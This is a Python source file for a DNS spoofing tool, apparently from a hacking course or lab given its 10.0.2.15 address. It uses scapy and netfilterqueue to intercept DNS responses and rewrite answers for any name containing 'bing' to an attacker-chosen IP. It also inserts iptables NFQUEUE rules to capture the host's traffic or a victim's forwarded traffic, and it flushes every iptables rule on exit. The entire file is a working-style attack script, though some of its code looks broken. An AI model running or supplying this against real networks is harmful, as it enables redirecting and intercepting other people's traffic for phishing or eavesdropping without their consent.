import subprocess
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "bing" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.15')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

def main():
    opt = 3
    try:
        while True:
            print("Run script on Host[1] or Victim[2]?")
            opt = input()
            if (opt == 1):
                print("[+] Running dns spoof attack on Host...")
                subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
                subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
                break
            elif (opt == 2):
                print("[+] Running dns spoof on Target...")
                subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
                break
            else:
                continue
        
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet) #Connect it to your queue ID and callback function
        queue.run()
    except(KeyboardInterrupt):
        subprocess.call("iptables --flush", shell=True)
        print("\n\n[+] IP Tables flushed")


if __name__ == '__main__':
    main()